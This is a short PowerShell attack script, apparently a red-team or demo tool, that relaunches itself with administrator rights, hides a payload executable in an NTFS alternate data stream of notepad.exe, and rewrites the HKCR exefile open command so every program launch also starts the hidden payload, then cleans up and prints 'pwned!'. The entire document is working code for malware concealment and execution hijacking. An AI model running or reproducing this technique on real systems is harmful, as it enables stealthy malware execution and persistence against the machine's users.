if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Start-Process powershell.exe -ArgumentList "-File `"$PSCommandPath`"" -Verb RunAs -Wait
	Write-Host "[*] Running as admin..."
    exit
}

$adsFilePath = "C:\Windows\System32\notepad.exe:hidden.exe"
$payloadPath = "C:\Path\To\Malicious.exe"
$regKey = "HKCR\exefile\shell\open\command"
$defaultCommand = "`"%1`" %*"

Write-Host "[*] Hiding Payload in NTFS ADS"
Get-Content $payloadPath | Set-Content $adsFilePath -Force -NoNewline

Write-Host "[*] Modifying registry..."
$maliciousCommand = "cmd.exe /c start $adsFilePath & `"%1`" %*"
Set-ItemProperty -Path "Registry::$regKey" -Name "(default)" -Value $maliciousCommand

Write-Host "[*] Waiting for execution..."
Start-Sleep -Seconds 10

Write-Host "[*] Cleaning up..."

Write-Host "[*] Removing ADS payload..."
Remove-Item $adsFilePath -Force

Write-Host "[*] Cleaning up registry"
Set-ItemProperty -Path "Registry::$regKey" -Name "(default)" -Value $defaultCommand
Write-Host "[*] pwned!"

